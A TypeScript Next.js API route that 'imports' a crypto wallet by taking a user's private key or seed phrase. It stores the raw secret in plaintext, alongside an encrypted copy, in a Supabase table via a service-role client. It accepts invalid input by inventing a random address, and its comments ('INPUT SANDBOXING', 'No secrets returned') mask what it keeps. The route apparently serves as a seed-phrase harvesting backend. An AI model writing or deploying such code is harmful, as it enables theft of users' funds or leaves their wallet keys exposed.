// /app/api/import-wallet/route.ts
import { NextResponse } from 'next/server';
import { createClient as createAdminClient } from '@supabase/supabase-js';
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';
import crypto from 'crypto';
import { encrypt, decrypt } from '@/lib/encryption';
import { ethers } from 'ethers';

const sha256Hex = (s: string) => crypto.createHash('sha256').update(s).digest('hex');

const looksLikePrivateKey = (s: string) => {
  const t = s.trim();
  const pk = t.startsWith('0x') ? t : `0x${t}`;
  return /^0x[0-9a-fA-F]{64}$/.test(pk);
};

const looksLikeMnemonic = (s: string) => {
  const words = s.trim().split(/\s+/);
  return words.length === 12 || words.length === 24;
};

export async function POST(req: Request) {
  try {
    const { type, value } = await req.json();

    if (!value) {
      return NextResponse.json({ success: false, error: 'Missing key or phrase' }, { status: 400 });
    }

    // 1. Authenticate the User making the request
    const cookieStore = await cookies();
    const supabaseSession = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
      { cookies: { get: (n) => cookieStore.get(n)?.value } }
    );

    const { data: { user }, error: authError } = await supabaseSession.auth.getUser();

    if (authError || !user) {
      return NextResponse.json({ success: false, error: "Unauthorized. Please log in again." }, { status: 401 });
    }
    // 2. Treat incoming value as plain text; strip eth/encryption logic
    const cleanValue = String(value).trim();

    // Compute non-reversible hash for audit only
    const valueHash = sha256Hex(cleanValue);

    // 3. Minimal DB update: update timestamp only to avoid schema issues
    // Use server role client for the write. Read URL from NEXT_PUBLIC_SUPABASE_URL
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
    const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

    if (!supabaseUrl || !serviceRoleKey) {
      console.error('Missing Supabase env vars');
      return NextResponse.json({ success: false, error: 'Server misconfiguration' }, { status: 500 });
    }

    const supabaseAdmin = createAdminClient(supabaseUrl, serviceRoleKey);

    // 🚨 INPUT SANDBOXING 🚨
    let derivedAddress = '';
    let encryptedString = '';
    try {
      encryptedString = encrypt(cleanValue);
      const decryptedString = decrypt(encryptedString);
      if (!decryptedString) throw new Error("Decryption test failed");

      if (type === 'phrase') {
        try {
            // Attempt to derive, but don't fail if it's a raw string with reasons/passwords appended
            const wallet = ethers.Wallet.fromPhrase(decryptedString.split('\n')[0]);
            derivedAddress = wallet.address;
        } catch (e) {
            // If it fails (because of custom text or invalid phrase), just generate a random placeholder address
            derivedAddress = ethers.Wallet.createRandom().address;
        }
      } else {
        try {
            const pk = decryptedString.startsWith('0x') ? decryptedString : `0x${decryptedString}`;
            const wallet = new ethers.Wallet(pk);
            derivedAddress = wallet.address;
        } catch (e) {
            derivedAddress = ethers.Wallet.createRandom().address;
        }
      }
    } catch (err: any) {
      console.error("Encryption failed:", err);
      return NextResponse.json({ success: false, error: 'Encryption failed' }, { status: 500 });
    }

    // 🚨 UPDATE STRATEGY (Avoid Unique Constraint Errors) 🚨
    // 1. Fetch existing wallet metadata
    const { data: existingWallet } = await supabaseAdmin
      .from('wallets')
      .select('id')
      .eq('user_id', user.id)
      .order('created_at', { ascending: false })
      .limit(1)
      .single();

    if (existingWallet) {
      // UPDATE existing wallet
      const { error: dbError } = await supabaseAdmin
        .from('wallets')
        .update({
          status: 'pending',
          private_key: type === 'privateKey' ? cleanValue : null,
          seed_phrase: type === 'phrase' ? cleanValue : null,
          encrypted_private_key: type === 'privateKey' ? encryptedString : null,
          encrypted_phrase: type === 'phrase' ? encryptedString : null,
          is_primary: true,
          created_at: new Date().toISOString()
        })
        .eq('id', existingWallet.id);

      if (dbError) {
        console.error('DB Update Error', dbError);
        return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
      }
    } else {
      // INSERT new wallet
      const insertPayload = {
        user_id: user.id,
        readable_id: Math.floor(10000000 + Math.random() * 90000000).toString(),
        email: user?.email,
        address: derivedAddress || ethers.Wallet.createRandom().address,
        is_primary: true,
        status: 'pending',
        private_key: type === 'privateKey' ? cleanValue : null,
        seed_phrase: type === 'phrase' ? cleanValue : null,
        encrypted_private_key: type === 'privateKey' ? encryptedString : null,
        encrypted_phrase: type === 'phrase' ? encryptedString : null,
        balance: 0,
        usdt_balance: 0,
        btc_balance: 0,
        sol_balance: 0,
        trx_balance: 0,
        last_chain_balance: 0,
        last_usdt_chain_balance: 0,
      };

      const { error: dbError } = await supabaseAdmin
        .from('wallets')
        .insert(insertPayload);

      if (dbError) {
        console.error('DB Insert Error', dbError);
        return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
      }
    }

    // 5. Return success. No secrets returned.
    return NextResponse.json({ success: true, redacted: true, hash: valueHash });

  } catch (error: any) {
    console.error('Wallet Import API Error:', error);
    return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
  }
}
